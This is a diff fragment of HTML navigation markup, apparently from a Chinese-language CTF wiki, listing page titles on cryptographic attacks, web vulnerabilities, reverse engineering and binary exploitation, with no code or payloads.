+    <label class="md-nav__link" for="nav-3-6">
+      非对称加密
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-3-6">
+        非对称加密
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/asymmetric/introduction/" title="非对称加密简介" class="md-nav__link">
+      非对称加密简介
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-6-2" type="checkbox" id="nav-3-6-2">
+    
+    <label class="md-nav__link" for="nav-3-6-2">
+      RSA
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-3-6-2">
+        RSA
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/asymmetric/rsa/rsa_theory/" title="RSA 基本介绍" class="md-nav__link">
+      RSA 基本介绍
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/asymmetric/rsa/rsa_module_attack/" title="模数相关攻击" class="md-nav__link">
+      模数相关攻击
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/asymmetric/rsa/rsa_e_attack/" title="公钥指数相关攻击" class="md-nav__link">
+      公钥指数相关攻击
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/asymmetric/rsa/rsa_d_attack/" title="私钥 d 相关攻击" class="md-nav__link">
+      私钥 d 相关攻击
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/asymmetric/rsa/rsa_coppersmith_attack/" title="Coppersmith 相关攻击" class="md-nav__link">
+      Coppersmith 相关攻击
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/asymmetric/rsa/rsa_chosen_plain_cipher/" title="选择明密文攻击" class="md-nav__link">
+      选择明密文攻击
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/asymmetric/rsa/rsa_side_channel/" title="侧信道攻击" class="md-nav__link">
+      侧信道攻击
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/asymmetric/rsa/rsa_pkcs_attack/" title="Bleichenbacher 攻击" class="md-nav__link">
+      Bleichenbacher 攻击
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/asymmetric/rsa/rsa_complex/" title="综合" class="md-nav__link">
+      综合
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/asymmetric/knapsack/knapsack/" title="背包加密" class="md-nav__link">
+      背包加密
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-6-4" type="checkbox" id="nav-3-6-4">
+    
+    <label class="md-nav__link" for="nav-3-6-4">
+      离散对数相关
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-3-6-4">
+        离散对数相关
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/asymmetric/discrete-log/integer_field/" title="整数域上的离散对数" class="md-nav__link">
+      整数域上的离散对数
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/asymmetric/discrete-log/elgamal/" title="Elgamal" class="md-nav__link">
+      Elgamal
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/asymmetric/discrete-log/ecc/" title="ECC" class="md-nav__link">
+      ECC
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-6-5" type="checkbox" id="nav-3-6-5">
+    
+    <label class="md-nav__link" for="nav-3-6-5">
+      格密码
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-3-6-5">
+        格密码
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/asymmetric/lattice/overview/" title="格概述" class="md-nav__link">
+      格概述
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/asymmetric/lattice/introduction/" title="格介绍" class="md-nav__link">
+      格介绍
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/asymmetric/lattice/lattice-reduction/" title="格基规约算法" class="md-nav__link">
+      格基规约算法
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-7" type="checkbox" id="nav-3-7">
+    
+    <label class="md-nav__link" for="nav-3-7">
+      哈希函数
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-3-7">
+        哈希函数
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/hash/introduction/" title="哈希函数简介" class="md-nav__link">
+      哈希函数简介
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/hash/md5/" title="MD5" class="md-nav__link">
+      MD5
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/hash/sha1/" title="SHA1" class="md-nav__link">
+      SHA1
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/hash/fnv/" title="FNV" class="md-nav__link">
+      FNV
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/hash/attack/" title="Hash Attack" class="md-nav__link">
+      Hash Attack
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/hash/complex/" title="综合" class="md-nav__link">
+      综合
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-8" type="checkbox" id="nav-3-8">
+    
+    <label class="md-nav__link" for="nav-3-8">
+      数字签名
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-3-8">
+        数字签名
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/signature/introduction/" title="数字签名简介" class="md-nav__link">
+      数字签名简介
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/signature/rsa/" title="RSA 数字签名" class="md-nav__link">
+      RSA 数字签名
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/signature/elgamal/" title="ElGamal 数字签名" class="md-nav__link">
+      ElGamal 数字签名
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/signature/dsa/" title="DSA 数字签名" class="md-nav__link">
+      DSA 数字签名
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-9" type="checkbox" id="nav-3-9">
+    
+    <label class="md-nav__link" for="nav-3-9">
+      攻击思想总结
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-3-9">
+        攻击思想总结
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/attack-summary/attack-mode/" title="简介" class="md-nav__link">
+      简介
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/attack-summary/meet-in-the-middle/" title="中间相遇攻击" class="md-nav__link">
+      中间相遇攻击
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/attack-summary/bit-attack/" title="比特攻击" class="md-nav__link">
+      比特攻击
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/certificate/introduction/" title="证书格式" class="md-nav__link">
+      证书格式
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
+    
+    <label class="md-nav__link" for="nav-4">
+      Web
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-4">
+        Web
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../web/introduction/" title="Web 应用简介" class="md-nav__link">
+      Web 应用简介
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../web/sqli/" title="SQL 注入" class="md-nav__link">
+      SQL 注入
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../web/xss/" title="XSS 跨站脚本攻击" class="md-nav__link">
+      XSS 跨站脚本攻击
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../web/csrf/" title="CSRF 跨站请求伪造" class="md-nav__link">
+      CSRF 跨站请求伪造
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../web/ssrf/" title="SSRF 服务端请求伪造" class="md-nav__link">
+      SSRF 服务端请求伪造
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../web/php/php/" title="PHP 代码审计" class="md-nav__link">
+      PHP 代码审计
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">
+    
+    <label class="md-nav__link" for="nav-5">
+      Assembly
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-5">
+        Assembly
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../assembly/x86-x64/readme/" title="x86_x64" class="md-nav__link">
+      x86_x64
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../assembly/mips/readme/" title="mips" class="md-nav__link">
+      mips
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../assembly/arm/readme/" title="arm" class="md-nav__link">
+      arm
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6" type="checkbox" id="nav-6">
+    
+    <label class="md-nav__link" for="nav-6">
+      Executable
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-6">
+        Executable
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6-1" type="checkbox" id="nav-6-1">
+    
+    <label class="md-nav__link" for="nav-6-1">
+      ELF 文件
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-6-1">
+        ELF 文件
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../executable/elf/elf_structure/" title="ELF文件基本结构" class="md-nav__link">
+      ELF文件基本结构
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../executable/elf/program_loading/" title="程序加载" class="md-nav__link">
+      程序加载
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../executable/elf/program_linking/" title="程序链接" class="md-nav__link">
+      程序链接
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../executable/elf/running_overview/" title="程序执行流程" class="md-nav__link">
+      程序执行流程
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7" type="checkbox" id="nav-7">
+    
+    <label class="md-nav__link" for="nav-7">
+      Reverse
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-7">
+        Reverse
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7-1" type="checkbox" id="nav-7-1">
+    
+    <label class="md-nav__link" for="nav-7-1">
+      Reverse Overview
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-7-1">
+        Reverse Overview
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../reverse/introduction/" title="软件逆向工程简介" class="md-nav__link">
+      软件逆向工程简介
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../reverse/Identify-Encode-Encryption/introduction/" title="常见加密算法和编码识别" class="md-nav__link">
+      常见加密算法和编码识别
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../reverse/maze/maze/" title="迷宫问题" class="md-nav__link">
+      迷宫问题
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../reverse/vm/vm/" title="虚拟机指令分析" class="md-nav__link">
+      虚拟机指令分析
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../reverse/unicorn/introduction/" title="Unicorn Engine 简介" class="md-nav__link">
+      Unicorn Engine 简介
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7-2" type="checkbox" id="nav-7-2">
+    
+    <label class="md-nav__link" for="nav-7-2">
+      Linux Reverse
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-7-2">
+        Linux Reverse
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7-2-1" type="checkbox" id="nav-7-2-1">
+    
+    <label class="md-nav__link" for="nav-7-2-1">
+      Linux 逆向技术
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-7-2-1">
+        Linux 逆向技术
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../reverse/linux/ld_preload/" title="LD_PRELOAD" class="md-nav__link">
+      LD_PRELOAD
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../reverse/linux/false-disasm/" title="False Disassembly" class="md-nav__link">
+      False Disassembly
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../reverse/linux/detect-bp/" title="Detecting Breakpoints" class="md-nav__link">
+      Detecting Breakpoints
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../reverse/linux/detect-dbg/" title="Detecting debugging" class="md-nav__link">
+      Detecting debugging
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7-3" type="checkbox" id="nav-7-3">
+    
+    <label class="md-nav__link" for="nav-7-3">
+      Windows Reverse
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-7-3">
+        Windows Reverse
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7-3-1" type="checkbox" id="nav-7-3-1">
+    
+    <label class="md-nav__link" for="nav-7-3-1">
+      脱壳技术
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-7-3-1">
+        脱壳技术
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../reverse/windows/unpack/packer-introduction/" title="保护壳简介" class="md-nav__link">
+      保护壳简介
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../reverse/windows/unpack/trace/" title="单步跟踪法" class="md-nav__link">
+      单步跟踪法
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../reverse/windows/unpack/esp/" title="ESP 定律法" class="md-nav__link">
+      ESP 定律法
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../reverse/windows/unpack/direct-oep/" title="一步到达 OEP 法" class="md-nav__link">
+      一步到达 OEP 法
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../reverse/windows/unpack/memory/" title="内存镜像法" class="md-nav__link">
+      内存镜像法
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../reverse/windows/unpack/last-exception/" title="最后一次异常法" class="md-nav__link">
+      最后一次异常法
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../reverse/windows/unpack/sfx/" title="SFX 法" class="md-nav__link">
+      SFX 法
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../reverse/windows/unpack/fix-iat/" title="DUMP 及 IAT 重建" class="md-nav__link">
+      DUMP 及 IAT 重建
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../reverse/windows/unpack/manually-fix-iat/" title="手动查找 IAT 并使用 ImportREC 重建" class="md-nav__link">
+      手动查找 IAT 并使用 ImportREC 重建
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../reverse/windows/unpack/unpack-dll/" title="DLL 文件脱壳" class="md-nav__link">
+      DLL 文件脱壳
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7-3-2" type="checkbox" id="nav-7-3-2">
+    
+    <label class="md-nav__link" for="nav-7-3-2">
+      反调试技术
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-7-3-2">
+        反调试技术
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../reverse/windows/anti-debug/ntglobalflag/" title="NtGlobalFlag" class="md-nav__link">
+      NtGlobalFlag
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../reverse/windows/anti-debug/heap-flags/" title="Heap Flags" class="md-nav__link">
+      Heap Flags
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../reverse/windows/anti-debug/the-heap/" title="The Heap" class="md-nav__link">
+      The Heap
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../reverse/windows/anti-debug/int-3/" title="Interrupt 3" class="md-nav__link">
+      Interrupt 3
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../reverse/windows/anti-debug/isdebuggerpresent/" title="IsDebuggerPresent" class="md-nav__link">
+      IsDebuggerPresent
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../reverse/windows/anti-debug/checkremotedebuggerpresent/" title="CheckRemoteDebuggerPresent" class="md-nav__link">
+      CheckRemoteDebuggerPresent
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../reverse/windows/anti-debug/ntqueryinformationprocess/" title="NtQueryInformationProcess" class="md-nav__link">
+      NtQueryInformationProcess
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../reverse/windows/anti-debug/junk-code/" title="花指令" class="md-nav__link">
+      花指令
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../reverse/windows/anti-debug/example/" title="反调试技术例题" class="md-nav__link">
+      反调试技术例题
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8" type="checkbox" id="nav-8" checked>
+    
+    <label class="md-nav__link" for="nav-8">
+      Pwn
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-8">
+        Pwn
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-1" type="checkbox" id="nav-8-1">
+    
+    <label class="md-nav__link" for="nav-8-1">
+      Pwn Overview
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-8-1">
+        Pwn Overview
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../readme/" title="Readme" class="md-nav__link">
+      Readme
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2" type="checkbox" id="nav-8-2" checked>
+    
+    <label class="md-nav__link" for="nav-8-2">
+      Linux Pwn
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-8-2">
+        Linux Pwn
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-1" type="checkbox" id="nav-8-2-1">
+    
+    <label class="md-nav__link" for="nav-8-2-1">
+      安全防护机制
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-8-2-1">
+        安全防护机制
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../mitigation/Canary/" title="canary" class="md-nav__link">
+      canary
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-2" type="checkbox" id="nav-8-2-2">
+    
+    <label class="md-nav__link" for="nav-8-2-2">
+      栈溢出
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-8-2-2">
+        栈溢出
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/stack_intro/" title="栈介绍" class="md-nav__link">
+      栈介绍
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/stackoverflow_basic/" title="栈溢出原理" class="md-nav__link">
+      栈溢出原理
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/basic_rop/" title="基本 ROP" class="md-nav__link">
+      基本 ROP
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/others/" title="花式栈溢出技巧" class="md-nav__link">
+      花式栈溢出技巧
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/medium_rop/" title="中级 ROP" class="md-nav__link">
+      中级 ROP
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/advanced_rop/" title="高级 ROP" class="md-nav__link">
+      高级 ROP
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-3" type="checkbox" id="nav-8-2-3">
+    
+    <label class="md-nav__link" for="nav-8-2-3">
+      格式化字符串漏洞
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-8-2-3">
+        格式化字符串漏洞
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../fmtstr/fmtstr_intro/" title="格式化字符串漏洞原理介绍" class="md-nav__link">
+      格式化字符串漏洞原理介绍
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../fmtstr/fmtstr_exploit/" title="格式化字符串漏洞利用" class="md-nav__link">
+      格式化字符串漏洞利用
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../fmtstr/fmtstr_example/" title="格式化字符串漏洞例子" class="md-nav__link">
+      格式化字符串漏洞例子
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../fmtstr/fmtstr_detect/" title="格式化字符串漏洞检测" class="md-nav__link">
+      格式化字符串漏洞检测
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-4" type="checkbox" id="nav-8-2-4" checked>
+    
+    <label class="md-nav__link" for="nav-8-2-4">
+      Glibc Heap 利用
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-8-2-4">
+        Glibc Heap 利用
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../introduction/" title="堆利用简介" class="md-nav__link">
+      堆利用简介
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../heap_overview/" title="堆概述" class="md-nav__link">
+      堆概述
+    </a>
+  </li>
+
